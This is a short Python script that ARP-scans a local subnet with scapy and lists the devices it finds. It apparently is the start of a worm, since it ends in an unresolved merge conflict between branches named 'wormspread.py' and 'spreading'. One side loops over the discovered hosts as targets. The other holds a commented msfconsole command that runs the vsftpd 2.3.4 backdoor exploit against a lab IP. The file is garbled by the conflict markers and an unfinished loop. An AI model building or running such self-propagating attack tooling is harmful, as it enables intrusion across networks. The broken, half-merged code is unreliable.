#!/usr/bin/env python3

import sys

from scapy.all import ARP, Ether, srp

target_ip = "192.168.56.111/24"

# create ARP packet
arp = ARP(pdst=target_ip)

# create the Ether broadcast packet
ether = Ether(dst="ff:ff:ff:ff:ff:ff")

# stack them
packet = ether/arp
result = srp(packet, timeout=3, verbose=0)[0]

# a list of clients, to be filled in the upcoming loop
clients = []

for sent, received in result:
    # for each response, append ip and mac address to `clients` list
    clients.append({'ip': received.psrc, 'mac': received.hwsrc})

# print clients
print("Available devices in the network:")
print("IP" + " "*18+"MAC")

for client in clients:
    print("{:16}    {}".format(client['ip'], client['mac']))

<<<<<<< HEAD:wormspread.py
for client in clients:
    target = client['ip']
=======

#define function to launch msfconsole

#In os.system

#msfconsole -q -x " use exploit/unix/ftp/vsftpd_234_backdoor; set rhost 192.168.56.111; run






    		
>>>>>>> 4e2f4293411c825532d5c348237449bac7762093:spreading